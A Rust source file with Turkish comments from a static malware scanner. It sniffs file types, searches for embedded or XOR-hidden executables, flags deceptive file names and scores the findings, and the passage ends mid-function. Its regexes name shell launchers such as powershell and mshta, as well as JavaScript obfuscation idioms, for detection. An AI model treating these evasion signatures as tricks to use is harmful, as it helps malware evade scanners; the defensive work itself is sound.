//! Tarama hatti: tur tespiti, tur bazli analiz, puanlama. JS `sniff/scanBuffer/scanFile` karsiligi.
//!
//! Bu surumde tam yapisal analiz: metin/betik, .lnk, bilinmeyen ikili. Diger turler (PE, ZIP/JAR, class, OLE, PDF...)
//! henuz Rust'a tasinmadi; onlar icin dize+kural taramasi yapilir ve sonuca ACIKCA "yapisal analiz yok" bulgusu/defter notu
//! eklenir (sessizce "temiz" denmez).

use crate::data::{self, ModeCfg, DISCLAIMER, META};
use crate::deobf::{self, st_ids, Ctx};
use crate::ioc::{add_ioc, finalize_ioc, IocSet};
use crate::model::{Analysis, Finding, ScanResult, Severity};
use crate::rules::{hits_to_findings, run_rules, Hits, Kind};
use crate::rx::{js, Rx};
use crate::score::{apply_combos, profile, score, sort_f, verdict};
use crate::state::St;
use crate::util::*;
use serde_json::Value;
use std::collections::HashSet;
use std::panic::{catch_unwind, AssertUnwindSafe};
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, LazyLock};

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum FileKind {
    Pe,
    Zip,
    MachoFat,
    Class,
    Macho,
    Elf,
    Rar,
    SevenZ,
    Gz,
    Ole,
    Lnk,
    Pdf,
    Image,
    Tar,
    OneNote,
    Rtf,
    Xz,
    Cab,
    Text,
    Bin,
}

impl FileKind {
    pub fn key(self) -> &'static str {
        match self {
            FileKind::Pe => "pe",
            FileKind::Zip => "zip",
            FileKind::MachoFat => "macho-fat",
            FileKind::Class => "class",
            FileKind::Macho => "macho",
            FileKind::Elf => "elf",
            FileKind::Rar => "rar",
            FileKind::SevenZ => "7z",
            FileKind::Gz => "gz",
            FileKind::Ole => "ole",
            FileKind::Lnk => "lnk",
            FileKind::Pdf => "pdf",
            FileKind::Image => "image",
            FileKind::Tar => "tar",
            FileKind::OneNote => "onenote",
            FileKind::Rtf => "rtf",
            FileKind::Xz => "xz",
            FileKind::Cab => "cab",
            FileKind::Text => "text",
            FileKind::Bin => "bin",
        }
    }
}

const TEXT_EXT: [&str; 34] = [
    "bat", "cmd", "ps1", "vbs", "vbe", "js", "jse", "wsf", "hta", "py", "sh", "txt", "json", "yml", "yaml", "xml", "html",
    "htm", "cfg", "ini", "toml", "properties", "md", "lua", "rb", "pl", "php", "svg", "reg", "url", "inf", "sct", "wsc", "",
];

fn is_image(u: &[u8]) -> bool {
    (u.len() > 8 && u[0] == 0x89 && u[1] == 0x50 && u[2] == 0x4e && u[3] == 0x47 && u[4] == 0x0d)
        || (u.len() > 4 && u[0] == 0xff && u[1] == 0xd8 && u[2] == 0xff)
        || (u.len() > 6 && u.starts_with(b"GIF8"))
}

static RTF_HEAD: LazyLock<Rx> = LazyLock::new(|| js(r"^\s{0,16}\{\\rtf", ""));

/// JS `tarList(u8)`: gecerli bir tar basligi zinciri var mi (yalniz ilk baslik sag-lamasi; ayrintili liste henuz yok).
fn tar_ok(u: &[u8]) -> bool {
    if u.len() < 512 {
        return false;
    }
    let h = &u[..512];
    let sum_field: String = h[148..156].iter().map(|&b| b as char).collect();
    let t = sum_field.trim_matches(|c: char| c == '\0' || c == ' ');
    let Ok(want) = u32::from_str_radix(t, 8) else { return false };
    let mut s: u32 = 0;
    for (i, &b) in h.iter().enumerate() {
        s += if (148..156).contains(&i) { 32 } else { b as u32 };
    }
    s == want
}

pub fn sniff(u: &[u8], name: &str) -> FileKind {
    let ext = ext_of(name);
    if u.len() >= 2 && u[0] == 0x4d && u[1] == 0x5a {
        return FileKind::Pe;
    }
    if u.len() >= 4 && u[0] == 0x50 && u[1] == 0x4b && (u[2] == 3 || u[2] == 5) {
        return FileKind::Zip;
    }
    if u.len() >= 8 && u[..4] == [0xca, 0xfe, 0xba, 0xbe] {
        let nf = u32::from_be_bytes([u[4], u[5], u[6], u[7]]);
        return if (1..45).contains(&nf) { FileKind::MachoFat } else { FileKind::Class };
    }
    if u.len() >= 4
        && ((u[0] == 0xfe && u[1] == 0xed && u[2] == 0xfa && (u[3] == 0xce || u[3] == 0xcf))
            || (u[3] == 0xfe && u[2] == 0xed && u[1] == 0xfa && (u[0] == 0xce || u[0] == 0xcf)))
    {
        return FileKind::Macho;
    }
    if u.len() >= 4 && u[..4] == [0x7f, 0x45, 0x4c, 0x46] {
        return FileKind::Elf;
    }
    if u.len() >= 6 && &u[..4] == b"Rar!" {
        return FileKind::Rar;
    }
    if u.len() >= 6 && u[..4] == [0x37, 0x7a, 0xbc, 0xaf] {
        return FileKind::SevenZ;
    }
    if u.len() >= 3 && u[0] == 0x1f && u[1] == 0x8b {
        return FileKind::Gz;
    }
    if u.len() >= 8 && u[..4] == [0xd0, 0xcf, 0x11, 0xe0] {
        return FileKind::Ole;
    }
    if u.len() >= 4 && u[..4] == [0x4c, 0, 0, 0] {
        return FileKind::Lnk;
    }
    if u.len() >= 5 && &u[..5] == b"%PDF-" {
        return FileKind::Pdf;
    }
    if is_image(u) {
        return FileKind::Image;
    }
    if u.len() >= 512 && ((&u[257..262] == b"ustar") || ext == "tar") && tar_ok(u) {
        return FileKind::Tar;
    }
    if u.len() >= 16 && META.one_magic.iter().enumerate().all(|(i, &b)| u[i] == b) {
        return FileKind::OneNote;
    }
    if u.len() >= 6 && RTF_HEAD.is_match(&ascii(u, 0, u.len().min(1030))) {
        return FileKind::Rtf;
    }
    if u.len() >= 6 && u[..6] == [0xfd, b'7', b'z', b'X', b'Z', 0] {
        return FileKind::Xz;
    }
    if u.len() >= 3 && &u[..3] == b"MSC" {
        return FileKind::Cab;
    }
    if TEXT_EXT[..33].contains(&ext.as_str()) {
        return FileKind::Text;
    }
    let n = u.len().min(4000);
    let bin = u[..n].iter().filter(|&&b| b == 0 || b < 7).count();
    if (bin as f64) / (n.max(1) as f64) < 0.02 { FileKind::Text } else { FileKind::Bin }
}

// ---- yardimcilar: gomulu/XOR'lu PE aramasi ----

pub fn find_all_mz(u: &[u8], from: usize, maxn: usize) -> Vec<usize> {
    let mut out = vec![];
    let mut i = from;
    while i + 0x40 < u.len() && out.len() < maxn {
        if u[i] == 0x4d && u[i + 1] == 0x5a {
            let l = u[i + 0x3c] as usize | (u[i + 0x3d] as usize) << 8 | (u[i + 0x3e] as usize) << 16;
            if l > 0 && l < 0x1000 && i + l + 4 < u.len() && u[i + l] == 0x50 && u[i + l + 1] == 0x45 && u[i + l + 2] == 0 && u[i + l + 3] == 0 {
                out.push(i);
                i += 0x200;
            }
        }
        i += 1;
    }
    out
}

pub fn xor_find_pe(u: &[u8], max_bytes: usize) -> Option<(u8, usize)> {
    let n = u.len().min(max_bytes);
    if n < 200 {
        return None;
    }
    let s = &u[..n];
    let needle = b"This program cannot be run";
    for k in 1..=255u8 {
        let nx: Vec<u8> = needle.iter().map(|b| b ^ k).collect();
        let Some(idx) = memchr::memmem::find(s, &nx) else { continue };
        for j in idx.saturating_sub(0x200)..idx {
            if (u[j] ^ k) == 0x4d && u.get(j + 1).is_some_and(|b| (b ^ k) == 0x5a) {
                return Some((k, j));
            }
        }
    }
    None
}

pub fn xor_decode(u: &[u8], start: usize, key: u8) -> Vec<u8> {
    u[start..].iter().map(|b| b ^ key).collect()
}

// ---- ad kontrolleri ----

const INVIS_CP: [(u32, u32); 8] =
    [(0x200b, 0x200f), (0x2028, 0x2029), (0x202a, 0x202d), (0x2060, 0x2064), (0x2066, 0x2069), (0xfeff, 0xfeff), (0xad, 0xad), (0x180e, 0x180e)];

fn script_of(c: char) -> &'static str {
    let c = c as u32;
    if (0x41..=0x5a).contains(&c) || (0x61..=0x7a).contains(&c) || (0xc0..=0x24f).contains(&c) {
        "Latin"
    } else if (0x400..=0x52f).contains(&c) {
        "Kiril"
    } else if (0x370..=0x3ff).contains(&c) {
        "Yunan"
    } else if (0x530..=0x58f).contains(&c) {
        "Ermeni"
    } else if (0xff21..=0xff5a).contains(&c) {
        "Tam genişlik"
    } else {
        ""
    }
}

pub struct Confusable {
    pub invisible: Vec<String>,
    pub mixed: Vec<String>,
}

pub fn confusable_name(name: &str) -> Confusable {
    let base = base_name(name);
    let mut inv: Vec<String> = vec![];
    for ch in base.chars() {
        let c = ch as u32;
        if INVIS_CP.iter().any(|&(a, b)| c >= a && c <= b) {
            let s = format!("U+{:04X}", c);
            if !inv.contains(&s) {
                inv.push(s);
            }
        }
    }
    let mut mixed = vec![];
    for tok in base.split(|c: char| !c.is_alphanumeric()) {
        if tok.chars().count() < 2 {
            continue;
        }
        let mut sc: Vec<&str> = vec![];
        for ch in tok.chars() {
            let s = script_of(ch);
            if !s.is_empty() && !sc.contains(&s) {
                sc.push(s);
            }
        }
        if sc.contains(&"Latin") && (sc.contains(&"Kiril") || sc.contains(&"Yunan") || sc.contains(&"Ermeni") || sc.contains(&"Tam genişlik")) {
            let t: String = tok.chars().take(40).collect();
            mixed.push(format!("{t} ({})", sc.join("+")));
        }
    }
    Confusable { invisible: inv, mixed }
}

// ---- sabit regex'ler ----

static DOUBLE_EXT: LazyLock<Rx> =
    LazyLock::new(|| js(r"\.(?:pdf|docx?|xlsx?|jpe?g|png|gif|txt|mp3|mp4|zip|rar)\.(?:exe|scr|bat|cmd|com|pif|js|vbs|ps1|jar|lnk)$", "i"));
static SCR_EXT: LazyLock<Rx> = LazyLock::new(|| js(r"\.(?:scr|pif|com|cpl)$", "i"));
static LNK_SHELL: LazyLock<Rx> = LazyLock::new(|| js(r"cmd\.exe|powershell|mshta|wscript|cscript", "i"));
static LNK_SHELL_EV: LazyLock<Rx> = LazyLock::new(|| js(r"(?:cmd|powershell|mshta|wscript|cscript)[^\n]{0,100}", "i"));
static FCC: LazyLock<Rx> = LazyLock::new(|| js(r"fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}", "i"));
static JS_EVAL_A: LazyLock<Rx> = LazyLock::new(|| js(r"\beval\s*\(|new\s+Function\s*\(|unescape\s*\(", ""));
static JS_EVAL_B: LazyLock<Rx> = LazyLock::new(|| js(r"atob\s*\(|fromCharCode|unescape", ""));
static HTA_HEAD: LazyLock<Rx> = LazyLock::new(|| js(r"^\s*<hta:application", "i"));

fn ev1(s: &str) -> Vec<String> {
    vec![s.to_string()]
}

fn text_of(u: &[u8], st: &St) -> Vec<Finding> {
    let mut hits = Hits::new();
    let strs = extract_strings(u, 6, st.cfg.str_cap as usize);
    run_rules(&strs.join("\n"), &mut hits, "", Kind::Other, st_ids(st).as_ref());
    let mut o = vec![];
    hits_to_findings(&hits, &mut o);
    o
}

struct Out {
    findings: Vec<Finding>,
    info: serde_json::Map<String, Value>,
    children: Vec<ScanResult>,
}

fn analyze_text(u: &[u8], name: &str, ext: &str, st: &mut St, depth: usize) -> Out {
    let cfg = st.cfg;
    let mut f: Vec<Finding> = vec![];
    let mut kids: Vec<ScanResult> = vec![];
    let cut = u.len() as f64 > cfg.text_cap;
    if cut {
        let m = fmt_n(cfg.text_cap);
        st.note(&format!("Büyük metin dosyası yalnızca ilk {m} kadarıyla tarandı."));
        st.limit_hit("text", &format!("Metin boyutu sınırı nedeniyle dosyanın yalnızca ilk {m} bölümü tarandı."));
    }
    let t = decode_text(if cut { &u[..cfg.text_cap as usize] } else { u });
    let mut hits = Hits::new();
    let ids = st_ids(st);
    run_rules(&t, &mut hits, "", Kind::Script, ids.as_ref());
    {
        let mut ctx = Ctx { hits: &mut hits, f: &mut f, kids: &mut kids, name, depth, seen: HashSet::new(), count: 0, layer: false };
        if cfg.deobf {
            deobf::deobf(&t, &mut ctx, st, 0);
        }
    }
    hits_to_findings(&hits, &mut f);
    let lines: Vec<&str> = t.split('\n').collect();
    let mut info = serde_json::Map::new();
    info.insert("kind".into(), Value::String(format!("Metin/betik ({})", if ext.is_empty() { "?" } else { ext })));
    info.insert("lines".into(), Value::from(lines.len()));
    info.insert("entropy".into(), num_json(to_fixed2(entropy(u))));
    if cfg.ioc > 0 {
        let mut io = IocSet::new();
        add_ioc(&mut io, &t, cfg.ioc);
        if let Some(fi) = finalize_ioc(&io) {
            info.insert("iocs".into(), Value::Object(fi));
        }
    }
    let longest = lines.iter().map(|l| l.encode_utf16().count()).max().unwrap_or(0);
    if longest > 20000 && lines.len() < 50 {
        f.push(Finding::mk("txt_oneline", Severity::Low, 6.0, "Tek satırda çok uzun içerik", "Betik neredeyse tek satırda; minify veya gizleme izi.", "Biçimlendirip oku.", vec![format!("{longest} karakter")], "obf"));
    }
    let fcc = FCC.find_all(&t, usize::MAX).len();
    if fcc > 60 {
        f.push(Finding::mk("js_escape", Severity::Med, 10.0, "Yoğun karakter kodu / kaçış dizisi", &format!("{fcc} adet fromCharCode/\\x/\\u kullanımı."), "Betiği çözümleyerek oku.", vec![], "obf"));
    }
    if JS_EVAL_A.is_match(&t) && JS_EVAL_B.is_match(&t) {
        f.push(Finding::mk("js_eval", Severity::High, 15.0, "eval + kodlama (JS)", "eval/Function ile çözülmüş metni çalıştırma.", "eval’i console.log ile değiştirip çıktıyı oku.", vec![], "obf"));
    }
    Out { findings: f, info, children: kids }
}

fn iso_now() -> String {
    let d = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
    let (secs, ms) = (d.as_secs() as i64, d.subsec_millis());
    let days = secs.div_euclid(86400);
    let rem = secs.rem_euclid(86400);
    // Howard Hinnant civil_from_days
    let z = days + 719468;
    let era = z.div_euclid(146097);
    let doe = z.rem_euclid(146097);
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let dd = doy - (153 * mp + 2) / 5 + 1;
    let mm = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if mm <= 2 { y + 1 } else { y };
    format!("{y:04}-{mm:02}-{dd:02}T{:02}:{:02}:{:02}.{ms:03}Z", rem / 3600, rem % 3600 / 60, rem % 60)
}

fn panic_msg(p: &Box<dyn std::any::Any + Send>) -> String {
    if let Some(s) = p.downcast_ref::<&str>() {
        s.to_string()
    } else if let Some(s) = p.downcast_ref::<String>() {
        s.clone()
    } else {
        "beklenmeyen hata".into()
    }
}

fn return_err(f: &mut Vec<Finding>, msg: &str, st: &mut St) {
    f.push(Finding::mk("scan_err", Severity::Info, 0.0, "Analiz hatası", msg, "Dosyayı başka bir araçla da kontrol et.", vec![], ""));
    st.unreadable += 1;
}

fn kind_label_unported(k: FileKind) -> &'static str {
    match k {
        FileKind::Pe => "Windows çalıştırılabilir (PE)",
        FileKind::Zip => "ZIP / JAR / Office arşivi",
        FileKind::Class => "Java class",
        FileKind::Ole => "OLE (eski Office/MSI)",
        FileKind::Pdf => "PDF",
        FileKind::Elf => "ELF",
        FileKind::Macho | FileKind::MachoFat => "Mach-O",
        FileKind::Image => "Resim",
        FileKind::Gz => "gzip",
        FileKind::Tar => "tar",
        FileKind::Rar => "RAR arşivi",
        FileKind::SevenZ => "7-Zip arşivi",
        FileKind::Cab => "CAB arşivi",
        FileKind::Rtf => "RTF",
        FileKind::OneNote => "OneNote",
        FileKind::Xz => "XZ arşivi",
        _ => "Dosya",
    }
}

pub fn scan_buffer(u: &[u8], name: &str, st: &mut St, depth: usize) -> ScanResult {
    st.tick();
    st.files += 1;
    let cfg = st.cfg;
    let mut res = ScanResult::new(name, u.len());
    res.entropy = to_fixed2(entropy(u));
    res.sha256 = Some(sha256_hex(u));
    if depth == 0 {
        res.sha1 = Some(sha1_hex(u));
    }
    let ck = format!("{}:{}", cfg.id, res.sha256.as_deref().unwrap_or(""));
    if depth > 0 {
        if let Some(c) = st.cache.get(&ck) {
            let mut c = c.clone();
            c.name = name.into();
            c.path = name.into();
            c.deduped = true;
            return c;
        }
    }
    let kind = sniff(u, name);
    let ext = ext_of(name);
    let base = base_name(name).to_string();
    let mut f: Vec<Finding> = vec![];
    let mut anl: Vec<Analysis> = vec![];
    res.kind_label = "Dosya".into();
    if base.contains('\u{202e}') {
        f.push(Finding::mk("name_rtlo", Severity::Crit, 35.0, "Ters yönlendirme (RTLO) karakterli dosya adı", "Dosya adında U+202E karakteri var; uzantıyı gizlemek için kullanılan bir sahtekarlık tekniğidir.", "Dosyayı açma.", vec![base.replace('\u{202e}', "‹RTLO›")], "arch"));
    }
    if DOUBLE_EXT.is_match(&base) {
        f.push(Finding::mk("name_double", Severity::High, 25.0, "Çift uzantılı dosya adı", "Zararsız görünen bir uzantının ardına çalıştırılabilir uzantı eklenmiş.", "Dosyayı açma. Gerçek türünü kontrol et.", ev1(&base), "arch"));
    }
    if SCR_EXT.is_match(&base) {
        f.push(Finding::mk("name_scr", Severity::Med, 10.0, &format!("Riskli uzantı ({ext})"), "Bu uzantılar çalıştırılabilir dosya olarak davranır ve sıklıkla kötüye kullanılır.", "Kaynağı güvenilir değilse çalıştırma.", ev1(&base), "arch"));
    }
    if kind == FileKind::Pe && META.decoy_ext.iter().any(|e| *e == ext) {
        f.push(Finding::mk("ext_mismatch", Severity::Crit, 40.0, "Uzantı sahtekarlığı", &format!("Dosya “.{ext}” görünüyor ama içeriği Windows çalıştırılabilir dosyası (MZ)."), "Dosyayı açma.", ev1(&base), "arch"));
    }

    let body = catch_unwind(AssertUnwindSafe(|| {
        let mut f2: Vec<Finding> = vec![];
        let mut anl2: Vec<Analysis> = vec![];
        let mut kids: Vec<ScanResult> = vec![];
        let mut info = serde_json::Map::new();
        let mut type_label = String::new();
        match kind {
            FileKind::Text => {
                type_label = "Metin / betik".into();
                let r = analyze_text(u, name, &ext, st, depth);
                f2.extend(r.findings);
                info = r.info;
                kids = r.children;
                if HTA_HEAD.is_match(&decode_text(&u[..u.len().min(2000)])) {
                    f2.push(Finding::mk("hta", Severity::High, 20.0, "HTA uygulaması", "HTA dosyaları tam yetkiyle betik çalıştırır.", "Açma; içeriği düzenleyiciyle oku.", vec![], "proc"));
                }
            }
            FileKind::Lnk => {
                type_label = "Windows kısayolu (.lnk)".into();
                let t = extract_strings(u, 4, cfg.str_cap as usize).join("\n");
                let mut hits = Hits::new();
                run_rules(&t, &mut hits, "", Kind::Other, st_ids(st).as_ref());
                hits_to_findings(&hits, &mut f2);
                if LNK_SHELL.is_match(&t) {
                    let e = LNK_SHELL_EV.find(&t).map(|m| clip(m, 140)).unwrap_or_default();
                    f2.push(Finding::mk("lnk_shell", Severity::High, 20.0, "Kabuk çağıran kısayol", "Kısayol bir komut yorumlayıcı/script motoru çalıştırıyor.", "Hedef komutu oku; açma.", vec![e], "proc"));
                }
            }
            FileKind::Bin => {
                type_label = "Bilinmeyen ikili".into();
                f2.extend(text_of(u, st));
                unknown_bin_extras(u, name, res.entropy, st, depth, &mut f2, &mut kids, &mut info);
            }
            FileKind::Zip => {
                match crate::archive::analyze_zip(u, name, &ext, st, depth, &mut f2) {
                    Ok(z) if !z.jar_unported => {
                        type_label = z.type_label;
                        info.insert("kind".into(), Value::String(z.info_kind));
                        for (k, v) in z.info {
                            info.insert(k, v);
                        }
                        kids = z.kids;
                        anl2.extend(z.analyses);
                    }
                    Ok(z) => {
                        type_label = z.type_label;
                        info.insert("kind".into(), Value::String(z.info_kind));
                        f2.extend(text_of(u, st));
                        f2.push(Finding::mk("rs_unported", Severity::Info, 0.0, "JAR/class: derin Java analizi bu motor sürümünde yok",
                            "Arşivde Java class dosyaları var; ancak class ayrıştırma, API/akış analizi ve girdi bazlı tarama Rust motorunda henüz yazılmadı. Yalnızca arşivin ham dize/kural taraması yapıldı (sıkıştırılmış girdilerin içi görülmez); bu, dosyanın zararsız olduğu anlamına gelmez.",
                            "Tam analiz için JS motorlu StatScan'i de kullan.", vec![], "arch").with_basis("fact"));
                        anl2.push(Analysis::led("struct", "JAR/class yapısal analizi", "unsupported", "Rust motorunda henüz taşınmadı"));
                    }
                    Err(e) => return_err(&mut f2, &e, st),
                }
            }
            FileKind::Class => {
                type_label = "Java class".into();
                if let Some(c) = crate::java::parse_class(u, false) {
                    let mut hits = Hits::new();
                    let ids = crate::deobf::st_ids(st);
                    run_rules(&c.utf8.join("\n"), &mut hits, &c.name, Kind::Other, ids.as_ref());
                    hits_to_findings(&hits, &mut f2);
                } else {
                    return_err(&mut f2, "Java class ayrıştırılamadı (bozuk veya kesik dosya)", st);
                }
            }
            FileKind::Xz => {
                type_label = "XZ arşivi".into();
                f2.push(Finding::mk("arch_unsupported", Severity::Info, 3.0, "XZ içeriği açılamadı", "Bu biçimin içindeki dosyalar taranamadı; yalnızca dış kabuk kapsandı.", "Arşivi güvenli bir yerde aç ve içindeki dosyaları tara.", vec![], "arch").with_basis("fact"));
                anl2.push(Analysis::led("xz", "XZ açma", "unsupported", "LZMA çözücü yok"));
            }
            other => {
                // Henuz tasinmamis tur: dize+kural taramasi + acik "yapisal analiz yok" kaydi.
                let lbl = kind_label_unported(other);
                type_label = lbl.into();
                f2.extend(text_of(u, st));
                if cfg.ioc > 0 {
                    let mut io = IocSet::new();
                    add_ioc(&mut io, &extract_strings(u, 6, cfg.str_cap as usize).join("\n"), cfg.ioc);
                    if let Some(fi) = finalize_ioc(&io) {
                        info.insert("iocs".into(), Value::Object(fi));
                    }
                }
                f2.push(Finding::mk("rs_unported", Severity::Info, 0.0, &format!("{lbl}: yapısal analiz bu motor sürümünde yok"),
                    &format!("Bu dosya {lbl} olarak tanındı, ancak Rust motorunda bu türün yapısal çözümlemesi (başlıklar, içerik, alt dosyalar) henüz yazılmadı. Yalnızca dize/kural taraması yapıldı; bu, dosyanın zararsız olduğu anlamına gelmez ve puan eksik kapsamla hesaplandı."),
                    "Tam analiz için JS motorlu StatScan'i de kullan.", vec![], "arch").with_basis("fact"));
                anl2.push(Analysis::led("struct", &format!("Yapısal analiz ({lbl})"), "unsupported", "Rust motorunda henüz taşınmadı; yalnızca dize/kural taraması"));
            }
        }
        (f2, anl2, kids, info, type_label)
    }));
    let (f2, anl2, kids, info, type_label) = match catch_unwind_result(body) {
        Ok(v) => v,
        Err(msg) => {
            f.push(Finding::mk("scan_err", Severity::Info, 0.0, "Analiz hatası", &msg, "Dosyayı başka bir araçla da kontrol et.", vec![], ""));
            st.unreadable += 1;
            (vec![], vec![], vec![], serde_json::Map::new(), String::new())
        }
    };
    f.extend(f2);
    anl.extend(anl2);
    res.children = kids;
    res.info = info;
    if !type_label.is_empty() {
        res.kind_label = type_label;
    }
    // Ek yontemler (ad denetimi)
    let cn = confusable_name(&base);
    if !cn.mixed.is_empty() {
        f.push(Finding::mk("name_confusable", Severity::Med, 10.0, "Karışık yazı sistemli (homoglif) ad", "Ad aynı sözcükte Latin harfleriyle Kiril/Yunan/Ermeni/tam genişlik harfleri karıştırıyor; görünüşte tanıdık bir adı taklit etmek için kullanılan bir sahtekarlık tekniğidir.", "Adı elle yazarak orijinaliyle karşılaştır; kaynağından emin değilsen açma.", cn.mixed.iter().take(4).cloned().collect(), "arch"));
    }
    if !cn.invisible.is_empty() {
        f.push(Finding::mk("name_invisible", Severity::Med, 12.0, "Görünmez/yön kontrol karakterli ad", "Ad görünmeyen karakterler (sıfır genişlik, yön kontrol vb.) içeriyor; uzantıyı veya adı gizlemek için kullanılabilir.", "Gerçek adı bir hex görüntüleyiciyle incele.", cn.invisible.iter().take(6).cloned().collect(), "arch"));
    }
    anl.push(Analysis::led("confusable", "Ad denetimi: homoglif (karışık yazı sistemi) ve görünmez karakter", "done", if cn.mixed.is_empty() && cn.invisible.is_empty() { "" } else { "bulgu var" }));
    if matches!(kind, FileKind::Pe | FileKind::Elf | FileKind::Macho | FileKind::Bin | FileKind::Text | FileKind::Zip) {
        anl.push(Analysis::led("sigs", "Bayt imzaları (YARA-lite: shellcode, Cobalt Strike, syscall, kripto sabitleri)", "unsupported", "Rust motorunda henüz taşınmadı"));
    }
    if depth == 0 {
        anl.push(Analysis::led("fuzzy", "Bulanık hash (CTPH) ve aile benzerliği", "unsupported", "Rust motorunda henüz taşınmadı"));
    }

    apply_combos(&mut f, st.java_allowed);
    sort_f(&mut f);
    res.findings = f;
    res.analyses = if depth == 0 { base_ledger(kind, st, &res).into_iter().chain(anl).collect() } else { anl };
    let own = score(&res.findings);
    let kid_max = res.children.iter().map(|c| c.score).max().unwrap_or(0);
    res.own_score = own;
    res.score = own.max(kid_max).min(100);
    res.verdict = verdict(res.score).into();
    res.profile = profile(&res.findings);
    if let Some(w) = res.children.iter().max_by_key(|c| c.score) {
        // JS: sort desc (stable) -> ilk = en yuksek puanlinin ilk eklenen
        let mut best = &res.children[0];
        for c in &res.children {
            if c.score > best.score {
                best = c;
            }
        }
        let _ = w;
        if best.score > own && best.score >= 10 {
            res.score_from = Some(best.name.clone());
        }
    }
    st.cache.insert(ck, res.clone());
    res
}

fn catch_unwind_result<T>(r: std::thread::Result<T>) -> Result<T, String> {
    r.map_err(|p| panic_msg(&p))
}

#[allow(clippy::too_many_arguments)]
fn unknown_bin_extras(u: &[u8], name: &str, entropy_v: f64, st: &mut St, depth: usize, f: &mut Vec<Finding>, kids: &mut Vec<ScanResult>, info: &mut serde_json::Map<String, Value>) {
    let cfg = st.cfg;
    if cfg.ioc > 0 {
        let mut io = IocSet::new();
        add_ioc(&mut io, &extract_strings(u, 6, cfg.str_cap as usize).join("\n"), cfg.ioc);
        if let Some(fi) = finalize_ioc(&io) {
            info.insert("iocs".into(), Value::Object(fi));
        }
    }
    if entropy_v > 7.5 && u.len() > 20000 {
        f.push(Finding::mk("bin_highent", Severity::Low, 6.0, "Yüksek entropili bilinmeyen veri", "Şifreli veya sıkıştırılmış bir blob olabilir.", "Başka bir dosyanın parçası mı kontrol et.", vec![format!("entropi {entropy_v}")], "obf"));
    }
    if cfg.deep_jar && u.len() <= 24_000_000 {
        for off in find_all_mz(u, 0, 4) {
            f.push(Finding::mk("pe_embedded", Severity::High, 14.0, "Veri içinde gömülü PE", "Bilinmeyen biçimli dosyanın içinde bir PE başlığı bulundu.", "Gömülü dosya ayrıca taranıyor.", vec![format!("ofset 0x{off:x}")], "pe"));
            if depth < cfg.depth {
                let k = scan_buffer(&u[off..], &format!("{name} › gömülü PE @0x{off:x}"), st, depth + 1);
                kids.push(k);
            }
        }
        if let Some((key, start)) = xor_find_pe(u, 24_000_000) {
            f.push(Finding::mk("xor_pe", Severity::Crit, 35.0, "XOR ile gizlenmiş çalıştırılabilir", &format!("Dosyada tek baytlık XOR anahtarıyla (0x{key:x}) gizlenmiş bir PE bulundu."), "Çözülmüş içerik ayrıca taranır.", vec![format!("ofset 0x{start:x}")], "pe"));
            if depth < cfg.depth {
                let d = xor_decode(u, start, key);
                let k = scan_buffer(&d, &format!("{name} › XOR çözülmüş PE"), st, depth + 1);
                kids.push(k);
            }
        }
    }
}

fn base_ledger(kind: FileKind, st: &St, res: &ScanResult) -> Vec<Analysis> {
    let cfg = st.cfg;
    let mut l = vec![];
    l.push(Analysis::led("type", "Dosya türü tespiti (imza/magic)", "done", kind.key()));
    l.push(Analysis::led("hash", "SHA-256, SHA-1 ve entropi", "done", if res.sha256.is_some() { "" } else { "SHA-256 hesaplanamadı" }));
    l.push(Analysis::led("names", "Ad/uzantı sahtekarlığı kontrolleri (RTLO, çift uzantı, içerik–uzantı uyumu)", "done", ""));
    l.push(Analysis::led("rules", "Dize/regex kural kataloğu", if cfg.ids.is_some() { "partial" } else { "done" }, if cfg.ids.is_some() { "Hızlı mod: yalnızca yüksek riskli kural alt kümesi" } else { "" }));
    l.push(Analysis::led("deobf", "Base64/hex/PowerShell/gzip katmanlarını çözüp yeniden tarama", if cfg.deobf { "done" } else { "skipped" }, if cfg.deobf { "" } else { "yalnızca Derin modda" }));
    l.push(Analysis::led("xor", "Tek baytlık XOR ile gizlenmiş PE arama", if cfg.xor { "done" } else { "skipped" }, if cfg.xor { "" } else { "yalnızca Derin modda" }));
    let ioc_label = format!("IOC çıkarımı (URL/IP{})", if cfg.ioc >= 2 { ", e-posta, kayıt defteri, yol, cüzdan" } else { "" });
    l.push(Analysis::led("ioc", &ioc_label, if cfg.ioc > 0 { "done" } else { "skipped" }, if cfg.ioc > 0 { "" } else { "Hızlı modda yapılmaz" }));
    l
}

#[derive(Clone)]
pub struct ScanOptions {
    pub mode: String,
    pub time_limit_ms: Option<u64>,
    pub cancel: Option<Arc<AtomicBool>>,
    pub java_allowed: bool,
}

impl Default for ScanOptions {
    fn default() -> Self {
        ScanOptions { mode: "normal".into(), time_limit_ms: None, cancel: None, java_allowed: false }
    }
}

fn mode_or_normal(m: &str) -> &'static ModeCfg {
    data::MODES.get(m).unwrap_or_else(|| data::mode("normal"))
}

/// JS `scanFile`: ust duzey tarama. `size_hint`: dosya boyutu (veri okunmadan once sinir denetimi icin).
pub fn scan_file(name: &str, data: &[u8], opts: &ScanOptions) -> ScanResult {
    scan_with_size(name, data.len(), || data.to_vec(), opts)
}

pub fn scan_with_size(name: &str, size: usize, load: impl FnOnce() -> Vec<u8>, opts: &ScanOptions) -> ScanResult {
    let cfg = mode_or_normal(&opts.mode);
    let limit = opts.time_limit_ms.unwrap_or(cfg.limit_ms as u64);
    let t0 = std::time::Instant::now();
    let mut st = St::new(cfg, limit, opts.cancel.clone(), opts.java_allowed);
    let mut res;
    if size as f64 > cfg.max_input {
        res = ScanResult::new(name, size);
        res.kind_label = "Taranamadı".into();
        res.verdict = "Taranamadı".into();
        let lim = fmt_n(cfg.max_input);
        res.findings = vec![Finding::mk("too_big", Severity::Info, 0.0, "Dosya çok büyük",
            &format!("Dosya boyutu ({}) güvenli tarama sınırını ({lim}) aşıyor; bellek kararlılığı için içerik okunmadı.", fmt_n(size as f64)),
            "Dosyayı bölerek tara.", vec![], "")];
        res.profile = profile(&[]);
        st.limit_hit("size", &format!("Dosya boyutu sınırı ({lim}) aşıldı; dosya taranmadı."));
    } else {
        let data = load();
        res = scan_buffer(&data, name, &mut st, 0);
    }
    for n in &META.never_led {
